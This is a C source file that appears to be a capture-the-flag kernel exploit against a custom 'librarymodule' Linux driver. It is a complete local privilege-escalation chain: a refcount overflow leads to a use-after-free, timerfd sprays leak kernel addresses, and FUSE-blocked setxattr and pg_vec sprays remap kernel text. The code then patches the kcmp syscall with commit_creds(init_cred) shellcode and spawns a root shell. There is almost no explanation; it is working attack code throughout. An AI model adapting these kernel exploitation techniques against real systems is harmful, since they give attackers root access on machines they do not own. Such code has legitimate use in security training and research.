#define _GNU_SOURCE
#define FUSE_USE_VERSION 30
#include <errno.h>
#include <fcntl.h>
#include <fuse.h>
// #include <linux/if_packet.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/xattr.h>

// gcc exploit.c -o exploit -D_FILE_OFFSET_BITS=64 `pkg-config fuse --cflags --libs` -pthread --static

#define DO_CREATE    0xc028ca00 
#define DO_DELETE    0xc028ca01
#define DO_BORROW    0xc028ca02
#define DO_READ      0xc028ca03
#define DO_NOTE      0xc028ca04
#define DO_RETURN    0xc028ca05

// GLOBAL VARIABLES
int fd;
int fuse_fd;
int fuse_fd2;
char * copy_map; 
char * block_map;
char * copy_map2; 
char * block_map2;
int fuse_pipe1[2];
int fuse_pipe2[2];
int spray1 = 0;
int spray2 = 0;
char * target_addr;

// LEAK VARIABLES
uint64_t kernel_leak;
uint64_t kernel_base; 
uint64_t kheap_256_addr;

// TIMERFD STUFF
#define NUM_TIMERFDS 512
int timerfds[NUM_TIMERFDS];
struct itimerspec timerValue;

// FUSE STUFF
int file_size = 4096; 

static int do_getattr(const char *path, struct stat *st) {
	
	st->st_uid = getuid();
	st->st_gid = getgid(); 
	st->st_atime = time( NULL ); 
	st->st_mtime = time( NULL ); 
	
	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2; 
	}
	else {
		st->st_mode = S_IFREG | 0644;
		st->st_nlink = 1;
		st->st_size = 1024;
	}
	return 0;
}

static int do_readdir(const char *path, void *buffer, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {

	filler(buffer, ".", NULL, 0); // Current Directory
	filler(buffer, "..", NULL, 0); // Parent Directory
	
	if (strcmp(path, "/") == 0 ) {
		filler(buffer, "exp", NULL, 0);
		filler(buffer, "exp2", NULL, 0);
	}
	return 0;
}

static int do_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi)  {
    dprintf(666, "--> Trying to read %s, %u, %u\n", path, offset, size);
    char signal; 
    
    if (strcmp(path, "/exp") == 0) {
        dprintf(666, "[+] FUSE: Block 1 reached\n");
        read(fuse_pipe1[0], &signal, 1); // Block here
        dprintf(666, "[+] FUSE: Block 1 released\n");
    } else if (strcmp(path, "/exp2") == 0) {
        dprintf(666, "[+] FUSE: Block 2 reached\n");
        read(fuse_pipe2[0], &signal, 1); // Block here
        dprintf(666, "[+] FUSE: Block 2 released\n");
    }
    return size; 
}

static struct fuse_operations operations = {
    .getattr	= do_getattr,
    .readdir	= do_readdir,
    .read	= do_read,
};

void fuse_setup_fn(void) {
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    
    if (mkdir("/tmp/fuse_dir", 0777)) {
        perror("[!] mkdir FUSE failed");
        exit(-1);
    }
    
    if (!(chan = fuse_mount("/tmp/fuse_dir", &args))) {
        perror("[!] fuse_mount failed");
        exit(-1);
    }
                                                                                          
    if (!(fuse = fuse_new(chan, &args, &operations, sizeof(operations), NULL))) {
        fuse_unmount("/tmp/fuse_dir", chan);
        perror("[!] Setup failed");
        exit(-1);
    }
    
    fuse_set_signal_handlers(fuse_get_session(fuse));
    fuse_loop_mt(fuse);
}

// SETXATTR X FUSE STUFF
#define NUM_SETXATTR 100
pthread_t thread[NUM_SETXATTR]; 
pthread_t thread2[NUM_SETXATTR]; 

void * setxattr_worker() {
    while (1) {
        if (spray1 == 1) {
            cpu_set_t cpu;
            CPU_ZERO(&cpu);
            CPU_SET(0, &cpu);
            if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
                perror("sched_setaffinity");
                exit(-1);
            }
            setxattr("/tmp", "aa", block_map-8-128, 200, 0);
        }
    }
}

void * setxattr_worker2() {
    while (1) {
        if (spray2 == 1) {
            cpu_set_t cpu;
            CPU_ZERO(&cpu);
            CPU_SET(0, &cpu);
            if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
                perror("sched_setaffinity");
                exit(-1);
            }
            setxattr("/tmp", "bb", block_map2-200, 200, 0);
        }
    }
}

// PG_VEC STUFF
#define NUM_PGVECS 60
int pgvecs[NUM_PGVECS];
void *pgaddr[NUM_PGVECS];

struct tpacket_req3 {
	unsigned int	tp_block_size;	/* Minimal size of contiguous block */
	unsigned int	tp_block_nr;	/* Number of blocks */
	unsigned int	tp_frame_size;	/* Size of frame */
	unsigned int	tp_frame_nr;	/* Total number of frames */
	unsigned int	tp_retire_blk_tov; /* timeout in msecs */
	unsigned int	tp_sizeof_priv; /* offset to private data area */
	unsigned int	tp_feature_req_word;
};

enum tpacket_versions {
	TPACKET_V1,
	TPACKET_V2,
	TPACKET_V3
};

int spray_pg_vec(uint64_t size) {
    int s = socket(AF_PACKET, SOCK_RAW, 0);
    int pkt_ver = TPACKET_V3;
    uint32_t blocksiz = 0x1000, framesiz = 0x1000 / 2;
    setsockopt(s, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof(pkt_ver));
    
    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = blocksiz;
    req.tp_frame_size = framesiz;
    req.tp_block_nr = size/8;
    req.tp_frame_nr = (blocksiz * (size/8)) / framesiz;
    req.tp_retire_blk_tov = 0xffffffff;
    req.tp_sizeof_priv = 0;
    req.tp_feature_req_word = 0;
    
    setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    
    return s;
}

// MODULE STUFF
struct req {
    uint64_t idx;
    uint64_t name_addr;
    uint64_t note_size;
    uint64_t note_addr;
    uint64_t info_addr;
};

int create_book(char * name, uint64_t size, char * note, char * info) {
    struct req req; 
    req.idx = 0;
    req.name_addr = (uint64_t) name;
    req.note_size = size;
    req.note_addr = (uint64_t) note;
    req.info_addr = (uint64_t) info;
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Created new book\n");
    return 0;
}

int delete_book(uint64_t index) {
    struct req req; 
    req.idx = index;
    req.name_addr = 0;
    req.note_size = 0;
    req.note_addr = 0;
    req.info_addr = 0;
    
    if (ioctl(fd, DO_DELETE, &req) < 0) {
        perror("[!] Delete failed");
        return -1;
    }
    printf("[+] Deleted book %d\n", index);
    return 0;
}

int borrow_book(uint64_t index) {
    struct req req; 
    req.idx = index;
    req.name_addr = 0;
    req.note_size = 0;
    req.note_addr = 0;
    req.info_addr = 0;
    
    if (ioctl(fd, DO_BORROW, &req) < 0) {
        perror("[!] Borrow failed");
        return -1;
    }
    printf("[+] Borrowed book %d\n", index);
    return 0;
}

int read_book(uint64_t index, char * name, char * note, char * info) {
    struct req req; 
    req.idx = index;
    req.name_addr = (uint64_t) name;
    req.note_size = 0;
    req.note_addr = (uint64_t) note;
    req.info_addr = (uint64_t) info;
    
    ioctl(fd, DO_READ, &req);

    printf("[+] Performed read\n");
    return 0;
}

int note_book(uint64_t index, uint64_t size, char * note) {
    struct req req; 
    req.idx = index;
    req.name_addr = 0;
    req.note_size = size;
    req.note_addr = (uint64_t) note;
    req.info_addr = 0;
    
    if (ioctl(fd, DO_NOTE, &req) < 0) {
        perror("[!] Change note failed");
        return -1;
    }
    printf("[+] Changed note of book %d\n", index);
    return 0;
}

int return_book(uint64_t index) {
    struct req req; 
    req.idx = index;
    req.name_addr = 0;
    req.note_size = 0;
    req.note_addr = 0;
    req.info_addr = 0;
    
    if (ioctl(fd, DO_RETURN, &req) < 0) {
        perror("[!] Return failed");
        return -1;
    }
    printf("[+] Returned book %d\n", index);
    return 0;
}

// PWN PWN PWN
uint64_t init_cred = 0; 
uint64_t commit_creds = 0;
uint8_t shellcode[] = {
    0x90, 0x90,
    0x48, 0xbf, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41,
    0x48, 0xb8, 0x68, 0x67, 0x66, 0x65, 0x64, 0x63, 0x62, 0x61,
    0xff, 0xd0,
    0xc3
};

// DEBUG HELPER
void debug(void) {
    printf("------------ PRESS ENTER ------------\n"); 
    getchar(); 
}

void examine(uint64_t* buffer, int n){
    fprintf(stderr, "========================= EXAMINE =========================\n");
    for (int i = 0; i < n; i++){
        fprintf(stderr, "[%04x] 0x%016lx\n", i, buffer[i]);
    }
}

int main(int argc, char *argv[]) {
    char name[0x100]; 
    char note[0x100]; 
    char info[0x100]; 
    char buf[1024];
    
    // STAGE 1: SETUP
    printf("STAGE 1: SETUP\n"); 
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Setup FUSE pipes for sync
    //printf("[+] Setting up fuse mutexes\n");
    //pipe(fuse_pipe1);
    //pipe(fuse_pipe2);
    socketpair(AF_LOCAL, SOCK_STREAM, 0, &fuse_pipe1[0]);
    socketpair(AF_LOCAL, SOCK_STREAM, 0, &fuse_pipe2[0]);
    
    // Make FUSE directory
    printf("[+] Making FUSE directory /tmp/fuse_dir\n");
    if (mkdir("/tmp/fuse_dir", 0777)) {
        perror("[!] mkdir FUSE failed");
    }
    sleep(1); 
    
    // Start the FUSE filesystem
    printf("[+] Starting FUSE filesystem\n");
    if (!fork()) {
        dup2(1, 666);
        fuse_main(argc, argv, &operations, NULL);
    }
    sleep(1); 
    dup2(1, 667); 
    
    // Open FUSE files
    fuse_fd = open("/tmp/fuse_dir/exp", O_RDWR);
    fuse_fd2 = open("/tmp/fuse_dir/exp2", O_RDWR);
    
    // Do mmap for FUSE
    printf("[+] Perform mmap\n"); 
    copy_map = mmap((void*)0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (copy_map == MAP_FAILED) {
        perror("[!] copy_map mmap failed"); 
        exit(-1);
    }
    printf("[+] copy_map: %p\n", copy_map);
    
    block_map = mmap(copy_map+0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd, 0);
    printf("[+] block_map: %p\n", block_map);
    if (block_map != (copy_map+0x1000)) {
        perror("[!] block_map mmap failed"); 
        exit(-1);
    }
    
    copy_map2 = mmap(copy_map+0x3000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (copy_map2 == MAP_FAILED) {
        perror("[!] copy_map2 mmap failed"); 
        exit(-1);
    }
    printf("[+] copy_map2: %p\n", copy_map2);
    
    block_map2 = mmap(copy_map+0x4000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);
    printf("[+] block_map2: %p\n", block_map2);
    if (block_map2 != (copy_map+0x4000)) {
        perror("[!] block_map2 mmap failed"); 
        exit(-1);
    }
    
    // Enter sandbox
    unshare(CLONE_NEWUSER);
    unshare(CLONE_NEWNET);
    
    // Open librarymodule device
    printf("[+] Opening library device\n");
    if ((fd = open("/dev/librarymodule", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // Initialize buf
    memset(buf, 0x0, sizeof(buf)); 
    
    // STAGE 2: LEAK
    printf("STAGE 2: KERNEL LEAK\n"); 
    
    // Create book 0
    memset(name, 0x41, sizeof(name)); 
    memset(note, 0x42, sizeof(note)); 
    memset(info, 0x43, sizeof(info));
    create_book(name, 0x0, note, info); 
    
    // Borrow book 0
    borrow_book(0);
    
    // Read book 0 to cause the refcount to loop back to 1
    for (int i = 0; i < 0xff; i++) {
        system("./increment");
    }
    
    // Setup setxattr heap spray
    printf("[+] Setup setxattr heap spray\n");
    for (int i = 0; i < NUM_SETXATTR; i++) {
        pthread_create(&thread[i], NULL, setxattr_worker, NULL);
    }
    
    // Delete book 0 to get UAF
    delete_book(0); 
    
    // Spray timerfds to reclaim UAF object
    printf("[+] Spraying timerfds\n");
    for (int i = 0; i < NUM_TIMERFDS; i++) {
        timerfds[i] = timerfd_create(CLOCK_REALTIME, 0); 
        timerValue.it_value.tv_sec = 1;
        timerValue.it_value.tv_nsec = 0;
        timerValue.it_interval.tv_sec = 1;
        timerValue.it_interval.tv_nsec = 0;
        timerfd_settime(timerfds[i],  0, &timerValue, NULL); 
    }   
    sleep(1);
    
    // Replace the note so that it doesn't crash
    note_book(0, 0x10, note); 
    
    // Read to get leaks
    memset(name, 0x0, sizeof(name)); 
    memset(note, 0x0, sizeof(note)); 
    memset(info, 0x0, sizeof(info)); 
    read_book(0, name, note, info);
    
    kheap_256_addr = ((uint64_t *)&name)[0];
    printf("[+] kmalloc-256 addr: 0x%llx\n", kheap_256_addr); 
    
    kernel_leak = ((uint64_t *)&name)[5];
    printf("[+] Kernel text leak: 0x%llx\n", kernel_leak); 
    
    kernel_base = kernel_leak - 0x411fd0; 
    printf("[+] Kernel text base: 0x%llx\n", kernel_base); 
    
    char *kcmp = kernel_base + 0x166730; 
    printf("[+] Kernel text kcmp: 0x%llx\n", kcmp); 
    
    // STAGE 3: USMA
    printf("STAGE 3: USMA\n"); 
    
    // Setup copy_map for setxattr spray 
    target_addr = block_map-8-128;
    ((uint64_t*)target_addr)[0] = 0x4141414141414141;
    ((uint64_t*)target_addr)[8] = 0x0; // idx
    ((uint64_t*)target_addr)[14] = kheap_256_addr; // note_addr
    
    // Free timerfds
    printf("[+] Freeing timerfds\n"); 
    for (int i = 0; i < NUM_TIMERFDS-1; i++) {
        close(timerfds[i]);
    }
    sleep(1);
    
    // Spray setxattr x FUSE to reclaim victim object
    printf("[+] Spraying setxattr\n"); 
    spray1 = 1; 
    sleep(1); 
    
    // Stop the spray
    printf("[+] Stopping the setxattr spray\n"); 
    spray1 = 0; 

    // Setup the second setxattr spray
    printf("[+] Setup setxattr heap spray 2\n");
    for (int i = 0; i < NUM_SETXATTR; i++) {
        pthread_create(&thread2[i], NULL, setxattr_worker2, NULL);
    }
    
    // Prepare block_map2 data (to overwrite pg_vec)
    target_addr = block_map2-200;
    for (int i = 0; i < 200/8; i++) {
        ((uint64_t*)target_addr)[i] = (char*)((uintptr_t)kcmp & ~(uintptr_t)0xFFF) + (0x1000 * i); 
    }
    
    // Free extra timerfd
    close(timerfds[NUM_TIMERFDS-1]);
    
    // Perform first free of double_free
    printf("[+] Perform first free of double free\n"); 
    note_book(0, 0x10, note); 
    sleep(2); 
    
    // Spray pg_vec
    printf("[+] Spray pg_vec\n");
    for (int i = 0; i < NUM_PGVECS; i++) {
        pgvecs[i] = spray_pg_vec(256); 
    }
    sleep(1); 

    // Release setxattr spray to get second free
    printf("[+] Releasing setxattr spray\n"); 
    write(fuse_pipe1[1], "A", 1);
    sleep(2); 
    
    // Spray second setxattr spray
    printf("[+] Spraying second setxattr spray\n"); 
    spray2 = 1; 
    sleep(2); 
    
    printf("[+] Perform mmap\n"); 
    for (int i = 0; i < NUM_PGVECS; i++) {
        if (!pgvecs[i]) {
            continue;
        }
        pgaddr[i] = mmap(NULL, ((256/8) * 0x1000), PROT_READ | PROT_WRITE, MAP_SHARED, pgvecs[i], 0);
    }
    
    printf("[+] Preparing shellcode\n"); 
    init_cred = kernel_base + 0x1c567e0; 
    commit_creds = kernel_base + 0xe1460; 
    memcpy(shellcode+4, &init_cred, 8);
    memcpy(shellcode+14, &commit_creds, 8);
    
    uint64_t *lmao = 0;
    for (int i = 0; i < NUM_PGVECS; i++) {
        //examine(pgaddr[i], 0x5);
        memcpy(pgaddr[i]+0x730, shellcode, sizeof(shellcode));
    }
    
    printf("[+] PWN TIME\n"); 
    syscall(312);
    if (getuid() == 0) {
        printf("[+] I'm root!!!");
        system("/bin/bash");
    }
    
    printf("==========");
    sleep(1000); 
    
    return 0;
    
}
